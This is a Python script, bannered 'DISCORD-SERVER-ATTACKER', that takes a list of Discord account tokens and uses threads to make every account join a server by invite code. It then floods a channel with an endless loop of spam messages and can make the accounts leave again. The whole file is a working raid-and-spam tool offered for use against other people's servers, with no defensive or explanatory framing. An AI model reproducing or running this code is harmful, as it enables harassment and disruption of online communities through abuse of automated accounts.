import requests, random, string
import concurrent.futures, sys
import threading
from keys import *
worker=2
def logo():
	dd=r'''
	██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
	██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
	██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
	██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
	██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
	╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
	===================================================
	--------------DISCORD-SERVER-ATTACKER--------------
	===================================================
'''
	print(dd)
def join(auth):
	headers={
		"Referer": "https://discordapp.com/activity",
		"authorization": auth,
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
	}
	web="https://discordapp.com/api/v6/invites/{}".format(invite)
	r=requests.post(web, headers=headers)
	global serverid
	global channelid
	serverid=r.json()["guild"]["id"]
	channelid=r.json()["channel"]["id"]
def message(auth):
	headers={
		"Referer": "https://discordapp.com/activity",
		"authorization": auth,
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
	}
	letters =string.digits
	new="".join(random.choice(letters) for _ in range(7))
	web="https://discordapp.com/api/v6/channels/{}/messages".format(channelid)
	send="hello bro its me"
	data={
		"content":send,
		"nonce":new,
		"tts":"false"
	}
	r=requests.post(web, headers=headers, data=data)
	#print("Message ID: "+r.json()["id"])
def leave(auth):
	headers={
		"Referer": "https://discordapp.com/activity",
		"authorization": auth,
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
	}
	web="https://discordapp.com/api/v6/users/@me/guilds/{}".format(serverid)
	requests.delete(web,headers=headers)
def joinrun():
	with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
		executor.map(join, key)
def leaverun():
	with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
		executor.map(leave, key)
def messagerun():
	with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
		executor.map(message, key)
def messageattack():
	def run1():
		while True:
			with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
				executor.map(message, key)
	def run2():
		while True:
			with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
				executor.map(message, key)
	def run3():
		while True:
			with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
				executor.map(message, key)
	def run4():
		while True:
			with concurrent.futures.ThreadPoolExecutor(max_workers=worker) as executor:
				executor.map(message, key)
	threading.Thread(target=run1).start()
	threading.Thread(target=run2).start()
	threading.Thread(target=run3).start()
	threading.Thread(target=run4).start()
if __name__ == '__main__':
	logo()
	logo='''
1) Join and Attack
2) Join
3) Attack
4) Leave 
	'''
	print(logo)
	while True:
		what=input("Select Option ->>")
		if what=="1":
			invite=input("Enter invite code ->>")
			print("{} Joining".format("[+]"))
			joinrun()
			print("{} Join Successful".format("[+]"))
			print("{} Attacking Now".format("[+]"))
			messageattack()

		elif what=="2":
			invite=input("Enter invite code ->>")
			print("{} Joining".format("[+]"))
			joinrun()
			print("{} Join Successful \nServer ID: {}".format("[+]", serverid))
		elif what=="3":
			channelid=input("Enter Channel ID ->>")
			print("{} Attacking Now".format("[+]"))
			messageattack()
		elif what=="4":
			serverid=input("Enter Server ID ->>")
			print("{} Leaving Now".format("[+]"))
			leaverun()
			print("{} Leave Successful".format("[+]"))
		else:
			print("Clean your eyes")
			tes=input("Run again or Exit (Y or N)").lower()
			if tes=="y":
				continue
			elif tes=="n":
				break
			else:
				break